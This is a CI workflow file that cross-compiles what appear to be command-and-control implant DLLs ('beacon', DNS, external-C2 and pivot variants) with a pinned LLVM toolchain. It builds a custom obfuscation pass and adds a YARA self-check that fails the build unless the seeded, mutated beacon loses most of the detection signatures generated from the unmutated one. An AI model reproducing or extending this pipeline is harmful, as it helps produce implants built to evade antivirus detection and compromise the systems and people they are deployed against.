name: llvm-build

# LLVM 工具链侧车（docs/LLVM-MIGRATION.md Phase 0/1）：
#   linux-x64   — 主轨：Linux 交叉编译全部变体（clang-cl --target windows-msvc
#                 + xwin SDK/CRT + lld-link）
#   windows-x64 — 对照轨：同一钉版 LLVM 在 Windows 主机构建 beacon 子集 +
#                 MSVC 基线 load_smoke（Phase 1 门）+ 导出表对照
#   byte-diff   — 双轨产物 /Brepro sha256 对照（实验性，暂不阻断：跨主机
#                 字节一致是目标态，首轮数据先归因）
on:
  push:
    branches: [llvm]
  workflow_dispatch:

env:
  LLVM_VERSION: 19.1.7
  XWIN_VERSION: 0.10.0

jobs:
  linux-x64:
    name: linux cross (all variants)
    runs-on: ubuntu-22.04
    steps:
      - uses: actions/checkout@v4

      - name: Cache cross toolchain
        uses: actions/cache@v4
        with:
          path: ~/.llvm-cross
          key: llvm-cross-${{ env.LLVM_VERSION }}-xwin-${{ env.XWIN_VERSION }}-linux-v1

      - name: Setup LLVM + xwin
        shell: bash
        run: bash tools/llvm/setup-host.sh

      - name: Build mutation pass plugin (CMake + AddLLVM, pinned LLVM)
        shell: bash
        run: |
          set -e
          source "$HOME/.llvm-cross/toolpath.env"
          LLVM_DIR="$HOME/.llvm-cross/llvm/lib/cmake/llvm"
          cmake -S tools/llvm/pass -B tools/llvm/pass/build \
            -DLLVM_DIR="$LLVM_DIR" -DCMAKE_BUILD_TYPE=Release
          cmake --build tools/llvm/pass/build -j 2
          ls -la tools/llvm/pass/build/obfpasses.so

      - name: Build all x64 variants
        shell: bash
        run: |
          set -e
          source "$HOME/.llvm-cross/toolpath.env"
          B=(python3 tools/llvm/build.py --clang-cl "$LLVM_CLANG"
             --lld-link "$LLVM_LLD" --xwin-dir "$XWIN_SPLAT")
          "${B[@]}" --layout --project beacon --platform x64
          "${B[@]}" --layout --project beacon --platform x64 --http winhttp
          "${B[@]}" --layout --project beacon --platform x64 --bofwin
          "${B[@]}" --layout --project dnsb   --platform x64
          "${B[@]}" --layout --project extc2  --platform x64
          "${B[@]}" --layout --project pivot  --platform x64
          "${B[@]}" --jobs 3 --project beacon --platform x64 --no-excreg --out-dir llvm-out-noex
          mv llvm-out-noex/beacon.x64.llvm.dll llvm-out/beacon.noexcreg.llvm.dll
          "${B[@]}" --jobs 3 --project beacon --platform x64 --diag-retaddr --out-dir llvm-out-rng
          mv llvm-out-rng/beacon.x64.llvm.dll llvm-out/beacon.rngdiag.llvm.dll
          "${B[@]}" --jobs 3 --project beacon --platform x64 --plain-sleep --layout --out-dir llvm-out-ps
          mv llvm-out-ps/beacon.x64.llvm.dll llvm-out/beacon.plainsleep.llvm.dll
          mv llvm-out-ps/beacon.x64.llvm.map llvm-out/beacon.plainsleep.llvm.map

          # ---- Phase 3: mutation pipeline ----
          # /Brepro caveat discovered here: lld-link's repro hash covers the
          # INPUT PATHS, so the out-dir is part of the reproducibility
          # contract. Baseline discriminator first (documents the caveat):
          "${B[@]}" --jobs 3 --project beacon --platform x64 --layout --out-dir llvm-out-base-2
          BASE_SHA=$(sha256sum llvm-out/beacon.x64.llvm.dll | cut -d' ' -f1)
          BASE2_SHA=$(sha256sum llvm-out-base-2/beacon.x64.llvm.dll | cut -d' ' -f1)
          if [ "$BASE_SHA" != "$BASE2_SHA" ]; then
            echo "baseline out-dir dependent CONFIRMED (/Brepro hashes input paths)"
          else
            echo "baseline out-dir independent (unexpected)"
          fi

          # A/B/C all in the SAME out-dir (cleared between runs)
          export OBF_SEED=1337
          echo 1337 > tools/llvm/pass/seed.txt
          rm -rf llvm-out-obf
          "${B[@]}" --jobs 3 --project beacon --platform x64 --layout --obf tools/llvm/pass/build/obfpasses.so --out-dir llvm-out-obf
          cp llvm-out-obf/beacon.x64.llvm.dll /tmp/obf_a.dll
          A_SHA=$(sha256sum /tmp/obf_a.dll | cut -d' ' -f1)
          rm -rf llvm-out-obf
          "${B[@]}" --jobs 3 --project beacon --platform x64 --layout --obf tools/llvm/pass/build/obfpasses.so --out-dir llvm-out-obf
          B_SHA=$(sha256sum llvm-out-obf/beacon.x64.llvm.dll | cut -d' ' -f1)
          if [ "$A_SHA" != "$B_SHA" ]; then
            echo "DETERMINISM FAIL: same seed gave different output"
            cmp -l /tmp/obf_a.dll llvm-out-obf/beacon.x64.llvm.dll | head -16 || true
            exit 1
          fi
          echo "determinism OK: $A_SHA"
          # did the pass actually run? its volatile seed global carries the
          # seed value into .data; scan for it and compare sizes vs baseline
          echo "seed-global hits baseline: $(python3 tools/llvm/scan_seed.py llvm-out/beacon.x64.llvm.dll 0)"
          echo "seed-global hits obf(1337): $(python3 tools/llvm/scan_seed.py /tmp/obf_a.dll 1337)"
          echo "sizes: baseline=$(stat -c%s llvm-out/beacon.x64.llvm.dll) obf=$(stat -c%s /tmp/obf_a.dll)"
          [ "$BASE_SHA" != "$A_SHA" ] || { echo "BASELINE COLLISION: obf build equals baseline - PASS DID NOT RUN"; exit 1; }
          export OBF_SEED=424242
          echo 424242 > tools/llvm/pass/seed.txt
          rm -rf llvm-out-obf
          "${B[@]}" --project beacon --platform x64 --layout --obf tools/llvm/pass/build/obfpasses.so --out-dir llvm-out-obf
          C_SHA=$(sha256sum llvm-out-obf/beacon.x64.llvm.dll | cut -d' ' -f1)
          [ "$A_SHA" != "$C_SHA" ] || { echo "UNIQUENESS FAIL: different seed gave identical output"; exit 1; }
          echo "uniqueness OK: $A_SHA vs $C_SHA"
          [ "$BASE_SHA" != "$A_SHA" ] || { echo "BASELINE COLLISION: obf build equals baseline"; exit 1; }
          echo "obf differs from baseline OK"
          cp /tmp/obf_a.dll llvm-out/beacon.obf.llvm.dll
          cp llvm-out-obf-a/beacon.x64.llvm.map llvm-out/beacon.obf.llvm.map 2>/dev/null || cp llvm-out-obf/beacon.x64.llvm.map llvm-out/beacon.obf.llvm.map
          echo "$A_SHA" > llvm-out/beacon.obf.sha256

          # ---- Phase 3: YARA self-check ----
          sudo apt-get install -y yara >/dev/null 2>&1
          python3 tools/llvm/gen_yara.py llvm-out/beacon.x64.llvm.dll llvm-out/beacon.x64.llvm.map llvm-out/bw_baseline.yar
          # baseline must match ALL of its own signatures
          BM=$(yara -w llvm-out/bw_baseline.yar llvm-out/beacon.x64.llvm.dll | grep -c bw_sig || true)
          echo "yara baseline matches: $BM"
          [ "$BM" -ge 6 ] || { echo "YARA FAIL: baseline does not match its own signatures"; exit 1; }
          # mutated build must LOSE most of them (statistical coverage gate:
          # a 32B window without any transformable instruction can survive)
          MM=$(yara -w llvm-out/bw_baseline.yar llvm-out/beacon.obf.llvm.dll | grep -c bw_sig || true)
          echo "yara mutated matches: $MM (of $BM)"
          LOST=$((BM - MM))
          [ "$LOST" -ge 6 ] || { echo "YARA FAIL: mutation lost only $LOST of $BM signatures"; exit 1; }
          echo "yara coverage OK: lost $LOST of $BM"

      - name: Size report
        shell: bash
        run: |
          {
            echo '### llvm linux-x64 build sizes'
            python3 tools/llvm/sizes_table.py llvm-out/_sizes.json
            echo
            echo '(MSVC 基线对照见主 build.yml 的 step summary)'
          } >> "$GITHUB_STEP_SUMMARY"

      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: llvm-linux-x64
          path: |
            llvm-out/*.dll
            llvm-out/*.map
            llvm-out/beacon.obf.sha256
            llvm-out/_sizes.json

  windows-x64:
    name: windows host (sidecar + phase-1 gate)
    runs-on: windows-2022
    defaults:
      run:
        shell: bash
    steps:
      - uses: actions/checkout@v4

      - name: Cache xwin splat
        uses: actions/cache@v4
        with:
          path: C:\Users\runneradmin\.llvm-cross
          key: llvm-cross-${{ env.LLVM_VERSION }}-xwin-${{ env.XWIN_VERSION }}-win-v1

      - name: Setup LLVM + xwin
        run: bash tools/llvm/setup-host.sh

      - name: Build llvm sidecar (beacon subset)
        run: |
          set -e
          source "$HOME/.llvm-cross/toolpath.env"
          PY=python; [[ -n "$(command -v python3)" ]] && PY=python3
          B=($PY tools/llvm/build.py --clang-cl "$LLVM_CLANG" --lld-link "$LLVM_LLD" --xwin-dir "$XWIN_SPLAT")
          "${B[@]}" --project beacon --platform x64
          "${B[@]}" --project beacon --platform x64 --http winhttp
          "${B[@]}" --project beacon --platform x64 --bofwin

      - name: Setup MSVC (baseline + smoke harness)
        uses: ilammy/msvc-dev-cmd@v1
        with:
          arch: x64

      - name: Build MSVC baseline beacon
        shell: pwsh
        run: ./build.ps1 -Project beacon -Toolset v143

      - name: Compile load_smoke harness
        shell: pwsh
        run: |
          New-Item -ItemType Directory -Force -Path tests\_build | Out-Null
          & cl /nologo /W3 /EHsc /MT tests\load_smoke.cpp /Fe:tests\_build\load_smoke.exe /Fo:tests\_build\
          if ($LASTEXITCODE -ne 0) { throw "load_smoke build failed" }

      - name: load_smoke — MSVC baseline (sanity)
        run: ./tests/_build/load_smoke.exe x64/Release/beacon.x64.dll

      - name: load_smoke — LLVM build (Phase 1 gate)
        run: |
          ./tests/_build/load_smoke.exe llvm-out/beacon.x64.llvm.dll
          ./tests/_build/load_smoke.exe llvm-out/winhttpb.x64.llvm.dll
          ./tests/_build/load_smoke.exe llvm-out/beacon.x64.rl0k.llvm.dll

      - name: Export table diff (MSVC vs LLVM)
        run: |
          source "$HOME/.llvm-cross/toolpath.env"
          python tools/llvm/compare_exports.py "$LLVM_READOBJ" x64/Release/beacon.x64.dll llvm-out/beacon.x64.llvm.dll

      - name: Size report
        shell: pwsh
        run: |
          $rows = (Get-ChildItem llvm-out/*.llvm.dll | ForEach-Object { "| $($_.Name) | $($_.Length) |" }) -join "`n"
          $msvc = Get-Item x64/Release/beacon.x64.dll
          "### llvm windows-x64 sidecar`n`n| dll | bytes |`n|---|---|`n$rows`n| MSVC baseline beacon.x64.dll | $($msvc.Length) |`n" >> $env:GITHUB_STEP_SUMMARY

      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: llvm-windows-x64
          path: |
            llvm-out/*.dll
            llvm-out/*.map

  byte-diff:
    name: dual-host /Brepro diff (experimental)
    needs: [linux-x64, windows-x64]
    runs-on: ubuntu-22.04
    continue-on-error: true
    steps:
      - uses: actions/checkout@v4
      - uses: actions/download-artifact@v4
        with: { name: llvm-linux-x64, path: lin }
      - uses: actions/download-artifact@v4
        with: { name: llvm-windows-x64, path: win }

      - name: sha256 compare
        shell: bash
        run: |
          python3 - <<'EOF' >> "$GITHUB_STEP_SUMMARY"
          import hashlib, os
          def sums(d):
              out = {}
              for f in sorted(os.listdir(d)):
                  if f.endswith(".dll"):
                      out[f] = hashlib.sha256(open(os.path.join(d, f), "rb").read()).hexdigest()
              return out
          lin, win = sums("lin"), sums("win")
          print("### dual-host byte-diff (/Brepro)\n")
          print("| dll | linux sha256 | windows sha256 | identical |")
          print("|---|---|---|---|")
          mismatch = []
          for f in sorted(set(lin) | set(win)):
              a, b = lin.get(f, "-"), win.get(f, "-")
              same = "YES" if a == b else ("n/a (single-host)" if f not in lin or f not in win else "no")
              if f in lin and f in win and a != b:
                  mismatch.append(f)
              print(f"| {f} | {a[:16]} | {b[:16]} | {same} |")
          # windows sidecar builds the beacon subset only: win must be a subset
          if not set(win) <= set(lin):
              print(f"\nvariant set mismatch: win-only={set(win)-set(lin)}")
              raise SystemExit(1)
          common = [f for f in win if f in lin]
          print(f"\nbyte-identical: {len(common)-len(mismatch)}/{len(common)} common")
          EOF
